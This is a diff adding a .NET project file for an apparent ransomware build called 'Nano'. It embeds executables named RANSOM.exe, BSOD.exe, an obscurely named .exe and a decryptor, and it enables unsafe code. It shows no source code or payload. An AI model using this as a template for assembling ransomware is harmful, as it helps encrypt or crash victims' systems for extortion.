@@ -1,0 +1,31 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>Nano</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net48</TargetFramework>
+    <Prefer32Bit>True</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>Preview</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <RootNamespace />
+  </PropertyGroup>
+  <ItemGroup>
+    <None Remove="Nano_Ransomware_1_.Resources.Capture.PNG" />
+    <None Remove="Nano_Ransomware_1_.Resources.RANSOM.exe" />
+    <None Remove="Nano_Ransomware_1_.Resources.BSOD.exe" />
+    <None Remove="Nano_Ransomware_1_.Resources.isudioewudo.exe" />
+    <None Remove="Nano_Ransomware_1_.Resources.Nano_Decrypt00r.exe" />
+    <EmbeddedResource Include="Nano_Ransomware_1_.Resources.Capture.PNG" />
+    <EmbeddedResource Include="Nano_Ransomware_1_.Resources.RANSOM.exe" />
+    <EmbeddedResource Include="Nano_Ransomware_1_.Resources.BSOD.exe" />
+    <EmbeddedResource Include="Nano_Ransomware_1_.Resources.isudioewudo.exe" />
+    <EmbeddedResource Include="Nano_Ransomware_1_.Resources.Nano_Decrypt00r.exe" />
+  </ItemGroup>
+  <ItemGroup />
+</Project>
